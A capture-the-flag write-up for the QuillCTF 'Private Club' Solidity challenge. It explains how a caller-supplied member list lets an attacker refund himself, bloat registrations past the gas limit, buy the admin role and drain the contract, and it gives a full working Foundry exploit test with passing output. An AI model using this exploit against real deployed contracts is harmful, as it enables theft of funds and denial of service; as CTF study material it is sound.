# QuillCTF : Private Club

## Object of CTF
In this CTF hacker is given 10 ethers and he asked to (1) become member of club, (2) block further registeration by exhausting gas Limit and (3) Withdraw all ethers from private club.

## Vulnerability Of Private Club Smart Contract
Vulnerability of Smart Contract lies in the fact that it's allowing users to send the list of members along with the transaction.

    function becomeMember(
        address[] calldata _members
    ) external payable nonReentrant {
    
So this should be list of users who are already members of club and new user will also have to send ethers equal to the number of members so that each member can get 1 ether on your admission. Now of course, hacker can send an array of with his own address. The length of this array is ofcourse going to be equal to total number of members. This way during the transaction all Eths will come back to hacker's own address during transaction. Also hacker can do it, again and again for **10 - totalNumberOfMembers**. This will exhaust all block gas and future registrations wont be possible.

Since, hacker has not yet spent any Ethers and still have 10 ETHs, he can use it to buy admin role and withdraw all tokens.

## Proof Of Concept
### Foundry Test


    // SPDX-License-Identifier: MIT
    pragma solidity ^0.8.0;
    
    import "forge-std/Test.sol";
    import "../src/PrivateClub.sol";
    
    contract Hack is Test {
        PrivateClub club;
    
        address clubAdmin = makeAddr("clubAdmin");
        address adminFriend = makeAddr("adminFriend");
        address user2 = makeAddr("user2");
        address user3 = makeAddr("user3");
        address user4 = makeAddr("user4");
        address hacker = makeAddr("hacker");
        uint blockGasLimit = 120000;
    
        function setUp() public {
            vm.deal(clubAdmin, 100 ether);
            vm.deal(hacker, 10 ether);
            vm.deal(user2, 10 ether);
            vm.deal(user3, 10 ether);
            vm.deal(user4, 10 ether);
            vm.startPrank(clubAdmin);
            club = new PrivateClub();
            club.setRegisterEndDate(block.timestamp + 5 days);
            club.addMemberByAdmin(adminFriend);
            address(club).call{value: 100 ether}("");
            vm.stopPrank();
            vm.startPrank(user2);
            address[] memory mForUser2 = new address[](1);
            mForUser2[0] = adminFriend;
            club.becomeMember{value: 1 ether}(mForUser2);
            vm.stopPrank();
            vm.startPrank(user3);
            address[] memory mForUser3 = new address[](2);
            mForUser3[0] = adminFriend;
            mForUser3[1] = user2;
            club.becomeMember{value: 2 ether}(mForUser3);
            vm.stopPrank();
        }
    
        function test_attack() public {
            vm.startPrank(hacker);
            // task1: become member of the club and
            // block future registrations (reason: out of gas - block gas limit)
            // solution:
    
            uint roomForNewMembers = 10-club.membersCount();
    
            for (uint x = 0; x < roomForNewMembers; x++) {
                address[] memory mForHacker = new address[](club.membersCount());
                for (uint i = 0; i < club.membersCount(); i++) {
                    mForHacker[i] = hacker;
                }
                uint ethForHacker = mForHacker.length * 1 ether;
                club.becomeMember{value: ethForHacker}(mForHacker);
            }
    
            vm.stopPrank();
            // check - hacker is member
            assertTrue(club.members(hacker));
    
    
            // check - user4 can not become member - blockGasLimit
            vm.startPrank(user4);
            address[] memory mForUser4 = new address[](club.membersCount());
            for (uint i = 0; i < club.membersCount(); i++) {
                mForUser4[i] = club.members_(i);
            }
            uint etherAmount = mForUser4.length * 1 ether;
            uint gasleftbeforeTxStart = gasleft();
            club.becomeMember{value: etherAmount}(mForUser4);
            uint gasleftAfterTxStart = gasleft();
    
            assertGt(gasleftbeforeTxStart - gasleftAfterTxStart, blockGasLimit);
            vm.stopPrank();
    
    
            vm.startPrank(hacker);
            // task2: buy admin role and withdraw all ether from the club
            // solution:
    
    
            club.buyAdminRole{value: 10 ether}(hacker);
            club.adminWithdraw(hacker, address(club).balance);
    
            // check - hacker is owner of club
            assertEq(club.owner(), hacker);
            assertGt(hacker.balance, 110000000000000000000 - 1);
        }
    }

	

### Foundry test output
	$ forge test --match-path test/AttackPrivateClub.t.sol
    [⠒] Compiling...
    No files changed, compilation skipped
    
    Running 1 test for test/AttackPrivateClub.t.sol:Hack
    [PASS] test_attack() (gas: 842941)
    Test result: ok. 1 passed; 0 failed; finished in 20.84ms
